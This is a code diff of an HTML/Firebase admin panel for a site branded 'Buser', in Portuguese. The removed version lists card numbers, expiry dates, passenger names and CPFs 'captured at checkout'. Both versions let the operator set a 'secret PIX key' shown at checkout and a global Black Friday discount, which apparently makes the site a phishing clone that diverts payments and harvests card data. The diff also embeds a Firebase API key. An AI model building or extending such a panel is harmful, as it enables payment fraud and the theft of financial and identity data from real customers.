@@ -2,98 +2,105 @@
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Painel Admin — Buser</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Painel de Controle | Buser</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
 <style>
-*{box-sizing:border-box}body{margin:0;font-family:'Poppins',sans-serif;background:#f4f4f8;color:#333}
-header{background:#f11075;color:#fff;padding:16px 24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
-header h1{margin:0;font-size:18px}
-header .badge{background:rgba(255,255,255,.2);padding:4px 12px;border-radius:20px;font-size:13px}
-.container{max-width:1200px;margin:24px auto;padding:0 16px}
-.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:24px}
-.stat{background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.05)}
-.stat h3{margin:0 0 8px;font-size:12px;color:#777;font-weight:500;text-transform:uppercase;letter-spacing:.5px}
-.stat .num{font-size:30px;font-weight:700;color:#f11075}
-.stat .sub{font-size:11px;color:#999;margin-top:4px}
-.card{background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.05);margin-bottom:24px}
-.card h2{margin:0 0 16px;font-size:15px;color:#f11075;border-bottom:2px solid #f11075;padding-bottom:8px;display:inline-block}
-table{width:100%;border-collapse:collapse;font-size:12px}
-th,td{text-align:left;padding:8px 6px;border-bottom:1px solid #eee;vertical-align:top}
-th{background:#fafafa;font-weight:600;color:#555;font-size:11px;text-transform:uppercase}
-tr:hover{background:#fff7fa}
-.badge{padding:2px 8px;border-radius:6px;font-size:10px;font-weight:600;display:inline-block}
-.badge.pendente{background:#fff3cd;color:#856404}
-.badge.pago{background:#d4edda;color:#155724}
-.badge.online{background:#d1ecf1;color:#0c5460}
-.badge.offline{background:#f0f0f0;color:#999}
-.form-row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
-.form-row input{flex:1;min-width:180px;padding:10px;border:1px solid #ddd;border-radius:8px;font-family:'Poppins'}
-.btn{background:#f11075;color:#fff;border:none;padding:10px 20px;border-radius:8px;font-weight:600;cursor:pointer;font-family:'Poppins'}
-.btn:hover{background:#e70869}
-.btn.sec{background:#555}
-.hint{font-size:11px;color:#999;margin-top:8px}
-#msg{font-size:13px;margin-top:8px;color:#155724;font-weight:600}
-.warn{background:#fff3cd;padding:10px;border-radius:8px;font-size:12px;color:#856404;margin-bottom:12px;border-left:4px solid #ffc107}
+  :root { --brand:#f11075; --grey-dark:#454545; --grey-light:#e0e0e0; --green:#40b552; }
+  * { box-sizing: border-box; }
+  body { font-family: 'Poppins', sans-serif; background: #f4f5f7; color: var(--grey-dark); margin: 0; padding: 24px; }
+  .container { max-width: 1000px; margin: 0 auto; }
+  h1 { color: var(--brand); margin-bottom: 24px; display: flex; align-items: center; gap: 12px; }
+  .status { font-size: 12px; font-weight: 600; color: var(--green); display: flex; align-items: center; gap: 4px; }
+  .status::before { content: ''; width: 8px; height: 8px; background: var(--green); border-radius: 50%; display: inline-block; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 32px; }
+  .card { background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid var(--grey-light); }
+  .card h3 { margin: 0 0 8px; font-size: 14px; color: #757575; text-transform: uppercase; letter-spacing: 0.5px; }
+  .card .number { font-size: 36px; font-weight: 700; color: var(--brand); }
+  .card .sub { font-size: 12px; color: #999; }
+  .section { background: #fff; border-radius: 16px; padding: 24px; margin-bottom: 24px; border: 1px solid var(--grey-light); }
+  .section h2 { margin-top: 0; color: var(--brand); border-bottom: 2px solid var(--brand); padding-bottom: 8px; display: inline-block; }
+  .input-group { margin-bottom: 16px; }
+  .input-group label { display: block; font-weight: 600; margin-bottom: 4px; font-size: 14px; }
+  .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-family: 'Poppins'; font-size: 14px; }
+  .input-group .sub { font-size: 12px; color: #999; margin-top: 4px; }
+  .btn { background: var(--brand); color: #fff; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 700; cursor: pointer; transition: 0.2s; font-family: 'Poppins'; }
+  .btn:hover { opacity: 0.8; }
+  table { width: 100%; border-collapse: collapse; margin-top: 16px; }
+  th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; font-size: 14px; }
+  th { color: #757575; font-weight: 600; font-size: 12px; text-transform: uppercase; }
+  tr:last-child td { border-bottom: none; }
 </style>
 </head>
 <body>
-<header>
-  <h1>⚙️ Painel Admin — Buser Black Friday</h1>
-  <span class="badge" id="online-badge">● Online: 0</span>
-</header>
-
 <div class="container">
+  <h1>📊 Painel de Controle <span class="status">Online</span></h1>
 
-  <div class="stats">
-    <div class="stat"><h3>Viagens pesquisadas</h3><div class="num" id="stat-viagens">0</div><div class="sub" id="stat-viagens-sub">—</div></div>
-    <div class="stat"><h3>PIX gerados</h3><div class="num" id="stat-pix">0</div><div class="sub" id="stat-pix-sub">R$ 0,00</div></div>
-    <div class="stat"><h3>Cartões</h3><div class="num" id="stat-cartoes">0</div><div class="sub" id="stat-cartoes-sub">R$ 0,00</div></div>
-    <div class="stat"><h3>Online agora</h3><div class="num" id="stat-online">0</div><div class="sub">últimos 60s</div></div>
-    <div class="stat"><h3>Visitas totais</h3><div class="num" id="stat-visitas">0</div><div class="sub">desde sempre</div></div>
-  </div>
-
-  <div class="card">
-    <h2>⚙️ Configuração do Site</h2>
-    <div class="warn">⚠️ A chave secreta PIX é usada pra gerar o código de recebimento. O desconto global é aplicado em TODAS as passagens do site em tempo real.</div>
-    <div class="form-row">
-      <input id="cfg-desconto" type="number" min="0" max="100" placeholder="Desconto global (%)">
-      <input id="cfg-chave-pix" placeholder="Chave secreta PIX (pra receber)">
+  <div class="grid">
+    <div class="card">
+      <h3>Pesquisas</h3>
+      <div class="number" id="pesquisas">0</div>
+      <div class="sub">Total de buscas realizadas</div>
     </div>
-    <button class="btn" id="btn-salvar">💾 Salvar configuração</button>
-    <div id="msg"></div>
-    <p class="hint">Após salvar, o site aplica o desconto imediatamente (listener em tempo real).</p>
+    <div class="card">
+      <h3>PIX Gerados</h3>
+      <div class="number" id="pix-gerados">0</div>
+      <div class="sub">Total de PIX criados</div>
+    </div>
+    <div class="card">
+      <h3>PIX Copiados</h3>
+      <div class="number" id="pix-copiados">0</div>
+      <div class="sub">Total de códigos copiados</div>
+    </div>
   </div>
 
-  <div class="card">
-    <h2>🔍 Viagens pesquisadas</h2>
-    <table><thead><tr><th>Origem</th><th>Destino</th><th>Ida</th><th>Volta</th><th>Quando</th></tr></thead>
-    <tbody id="tbl-viagens"><tr><td colspan="5">Carregando...</td></tr></tbody></table>
+  <div class="section">
+    <h2>⚙️ Configurações do Site</h2>
+    
+    <div class="input-group">
+      <label>API Key do Blackcat (para gerar PIX)</label>
+      <input type="text" id="blackcat-key" placeholder="Cole aqui a API Key do Blackcat">
+      <div class="sub">A chave fornecida pelo Blackcat para gerar PIX.</div>
+    </div>
+
+    <div class="input-group">
+      <label>Desconto Global (%)</label>
+      <input type="number" id="desconto" placeholder="Ex: 10" min="0" max="100">
+      <div class="sub">Desconto aplicado em todas as viagens do site.</div>
+    </div>
+
+    <div class="input-group">
+      <label>Chave PIX Secreta</label>
+      <input type="text" id="chave-pix" placeholder="Cole aqui a chave PIX secreta">
+      <div class="sub">Chave PIX que será exibida no checkout.</div>
+    </div>
+
+    <button class="btn" onclick="salvarConfig()">Salvar Configurações</button>
+    <p id="msg-config" style="color: var(--green); font-weight: 600; display: none; margin-top: 12px;">✅ Configurações salvas com sucesso!</p>
   </div>
 
-  <div class="card">
-    <h2>💸 PIX gerados</h2>
-    <table><thead><tr><th>Passageiro</th><th>CPF</th><th>Valor</th><th>Rota</th><th>Chave</th><th>Status</th><th>Quando</th></tr></thead>
-    <tbody id="tbl-pix"><tr><td colspan="7">Carregando...</td></tr></tbody></table>
+  <div class="section">
+    <h2>📋 Últimas Pesquisas</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Data/Hora</th>
+          <th>Origem</th>
+          <th>Destino</th>
+        </tr>
+      </thead>
+      <tbody id="tabela-pesquisas">
+        <tr><td colspan="3" style="text-align: center; color: #999;">Carregando...</td></tr>
+      </tbody>
+    </table>
   </div>
-
-  <div class="card">
-    <h2>💳 Cartões (dados capturados no checkout)</h2>
-    <table><thead><tr><th>Passageiro</th><th>Cartão</th><th>Validade</th><th>Bandeira</th><th>Valor</th><th>Status</th><th>Quando</th></tr></thead>
-    <tbody id="tbl-cartoes"><tr><td colspan="7">Carregando...</td></tr></tbody></table>
-  </div>
-
-  <div class="card">
-    <h2>🟢 Clientes online (tempo real)</h2>
-    <table><thead><tr><th>User ID</th><th>Entrou em</th><th>Último ping</th><th>Status</th></tr></thead>
-    <tbody id="tbl-online"><tr><td colspan="4">Conectando...</td></tr></tbody></table>
-  </div>
-
 </div>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
 <script>
 const firebaseConfig = {
   apiKey: "AIzaSyCMoq8MNOUjlhqWhjaJ24uW4grhsFFhA",
@@ -108,104 +115,74 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 const fs = firebase.firestore();
 
-/* ===== CONFIG ===== */
-function carregarConfig() {
-  fs.collection("config").doc("global").get().then(snap => {
-    if (snap.exists) {
-      const c = snap.data();
-      document.getElementById("cfg-desconto").value = c.descontoGlobal || "";
-      document.getElementById("cfg-chave-pix").value = c.chavePixSecreta || "";
-    }
-  }).catch(e => console.warn("Erro ao ler config:", e));
+// ===== SALVAR CONFIGURAÇÕES =====
+function salvarConfig() {
+  const blackcatKey = document.getElementById('blackcat-key').value;
+  const desconto = parseFloat(document.getElementById('desconto').value) || 0;
+  const chavePix = document.getElementById('chave-pix').value;
+
+  fs.collection("config").doc("global").set({
+    blackcatKey: blackcatKey,
+    descontoGlobal: desconto,
+    chavePixSecreta: chavePix,
+    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+  }).then(() => {
+    const msg = document.getElementById('msg-config');
+    msg.style.display = 'block';
+    setTimeout(() => { msg.style.display = 'none'; }, 3000);
+  }).catch(err => {
+    console.error(err);
+    alert('Erro ao salvar: ' + err.message);
+  });
 }
-carregarConfig();
 
-document.getElementById("btn-salvar").onclick = () => {
-  const descontoGlobal = parseFloat(document.getElementById("cfg-desconto").value) || 0;
-  const chavePixSecreta = document.getElementById("cfg-chave-pix").value.trim();
+// ===== CARREGAR CONFIGURAÇÕES =====
+fs.collection("config").doc("global").onSnapshot(snap => {
+  if (snap.exists) {
+    const data = snap.data();
+    document.getElementById('blackcat-key').value = data.blackcatKey || '';
+    document.getElementById('desconto').value = data.descontoGlobal || 0;
+    document.getElementById('chave-pix').value = data.chavePixSecreta || '';
+  }
+});
+
+// ===== ESTATÍSTICAS EM TEMPO REAL =====
+fs.collection("pesquisas").onSnapshot(snap => {
+  document.getElementById('pesquisas').textContent = snap.size;
   
-  document.getElementById("msg").textContent = "Salvando...";
-  document.getElementById("msg").style.color = "#666";
-
-  fs.collection("config").doc("global").set({ descontoGlobal, chavePixSecreta }, { merge: true })
-    .then(() => {
-      document.getElementById("msg").style.color = "#155724";
-      document.getElementById("msg").textContent = "✅ Salvo! O site já está aplicando o desconto.";
-      setTimeout(() => document.getElementById("msg").textContent = "", 4000);
-    })
-    .catch(e => {
-      document.getElementById("msg").style.color = "#d81b60";
-      document.getElementById("msg").textContent = "❌ Erro: " + e.message;
-      alert("Erro ao salvar!\n\nO Firestore está ativado no seu Firebase? Verifique no console.\n\nDetalhe: " + e.message);
+  const tabela = document.getElementById('tabela-pesquisas');
+  if (snap.size === 0) {
+    tabela.innerHTML = '<tr><td colspan="3" style="text-align: center; color: #999;">Nenhuma pesquisa registrada ainda.</td></tr>';
+    return;
+  }
+  
+  const pesquisas = [];
+  snap.forEach(doc => {
+    const d = doc.data();
+    pesquisas.push({
+      data: d.timestamp ? d.timestamp.toDate().toLocaleString('pt-BR') : '--',
+      origem: d.origem,
+      destino: d.destino
     });
-};
-
-/* ===== VIAGENS PESQUISADAS ===== */
-fs.collection("viagens_pesquisadas").orderBy("timestamp", "desc").limit(50).onSnapshot(snap => {
-  const tbody = document.getElementById("tbl-viagens");
-  if (snap.empty) { tbody.innerHTML = '<tr><td colspan="5">Nenhuma ainda.</td></tr>'; return; }
-  let ultima = "";
-  tbody.innerHTML = snap.docs.map(d => {
-    const v = d.data();
-    const t = v.timestamp?.toDate ? v.timestamp.toDate().toLocaleString("pt-BR") : "—";
-    if (!ultima) ultima = t;
-    return `<tr><td>${v.origem}</td><td>${v.destino}</td><td>${v.dataIda||"—"}</td><td>${v.dataVolta||"—"}</td><td>${t}</td></tr>`;
-  }).join("");
-  document.getElementById("stat-viagens").textContent = snap.size;
-  document.getElementById("stat-viagens-sub").textContent = "última: " + ultima;
+  });
+  
+  pesquisas.sort((a, b) => new Date(b.data) - new Date(a.data));
+  
+  tabela.innerHTML = pesquisas.slice(0, 10).map(p => `
+    <tr>
+      <td>${p.data}</td>
+      <td>${p.origem}</td>
+      <td>${p.destino}</td>
+    </tr>
+  `).join('');
 });
 
-/* ===== PIX ===== */
-fs.collection("pix_gerados").orderBy("timestamp", "desc").limit(50).onSnapshot(snap => {
-  const tbody = document.getElementById("tbl-pix");
-  if (snap.empty) { tbody.innerHTML = '<tr><td colspan="7">Nenhum PIX ainda.</td></tr>'; document.getElementById("stat-pix").textContent="0"; return; }
-  let total = 0;
-  tbody.innerHTML = snap.docs.map(d => {
-    const p = d.data(); total += p.total || 0;
-    const t = p.timestamp?.toDate ? p.timestamp.toDate().toLocaleString("pt-BR") : "—";
-    const rota = p.viagem ? `${p.viagem.departure?.terminal||"?"} → ${p.viagem.arrival?.terminal||"?"}` : "—";
-    const pas = (p.passageiros && p.passageiros[0]) ? p.passageiros[0] : {nome:"?",cpf:"?"};
-    const st = p.status || "pendente";
-    return `<tr><td>${pas.nome}</td><td>${pas.cpf}</td><td>R$ ${(p.total||0).toFixed(2)}</td><td>${rota}</td><td>${p.chaveSecretaUsada||"—"}</td><td><span class="badge ${st}">${st}</span></td><td>${t}</td></tr>`;
-  }).join("");
-  document.getElementById("stat-pix").textContent = snap.size;
-  document.getElementById("stat-pix-sub").textContent = "R$ " + total.toFixed(2);
+fs.collection("pix_gerados").onSnapshot(snap => {
+  document.getElementById('pix-gerados').textContent = snap.size;
 });
 
-/* ===== CARTÕES ===== */
-fs.collection("cartoes").orderBy("timestamp", "desc").limit(50).onSnapshot(snap => {
-  const tbody = document.getElementById("tbl-cartoes");
-  if (snap.empty) { tbody.innerHTML = '<tr><td colspan="7">Nenhum cartão ainda.</td></tr>'; document.getElementById("stat-cartoes").textContent="0"; return; }
-  let total = 0;
-  tbody.innerHTML = snap.docs.map(d => {
-    const c = d.data(); total += c.total || 0;
-    const t = c.timestamp?.toDate ? c.timestamp.toDate().toLocaleString("pt-BR") : "—";
-    const pas = (c.passageiros && c.passageiros[0]) ? c.passageiros[0] : {nome:"?",cpf:"?"};
-    const num = c.cartao?.numero || "";
-    const numMask = num.length > 4 ? "**** **** **** " + num.slice(-4) : num;
-    const st = c.status || "processando";
-    return `<tr><td>${pas.nome} (${pas.cpf})</td><td>${numMask}</td><td>${c.cartao?.validade||"—"}</td><td>${c.cartao?.bandeira||"—"}</td><td>R$ ${(c.total||0).toFixed(2)}</td><td><span class="badge ${st==='pago'?'pago':'pendente'}">${st}</span></td><td>${t}</td></tr>`;
-  }).join("");
-  document.getElementById("stat-cartoes").textContent = snap.size;
-  document.getElementById("stat-cartoes-sub").textContent = "R$ " + total.toFixed(2);
-});
-
-/* ===== ONLINE (Realtime) ===== */
-db.ref("visitas").on("value", snap => {
-  const data = snap.val() || {};
-  const agora = Date.now();
-  const todos = Object.entries(data);
-  const ativos = todos.filter(([id, v]) => v.online && (agora - (v.ultimoPing || v.entrouEm || 0) < 60000));
-  document.getElementById("stat-online").textContent = ativos.length;
-  document.getElementById("online-badge").textContent = `● Online: ${ativos.length}`;
-  document.getElementById("stat-visitas").textContent = todos.length;
-  const tbody = document.getElementById("tbl-online");
-  if (!ativos.length) { tbody.innerHTML = '<tr><td colspan="4">Ninguém online agora.</td></tr>'; return; }
-  tbody.innerHTML = ativos.map(([id, v]) => {
-    const ent = v.entrouEm ? new Date(v.entrouEm).toLocaleTimeString("pt-BR") : "—";
-    const ping = v.ultimoPing ? new Date(v.ultimoPing).toLocaleTimeString("pt-BR") : "—";
-    return `<tr><td>${id}</td><td>${ent}</td><td>${ping}</td><td><span class="badge online">online</span></td></tr>`;
-  }).join("");
+fs.collection("pix_copiados").onSnapshot(snap => {
+  document.getElementById('pix-copiados').textContent = snap.size;
 });
 </script>
 </body>
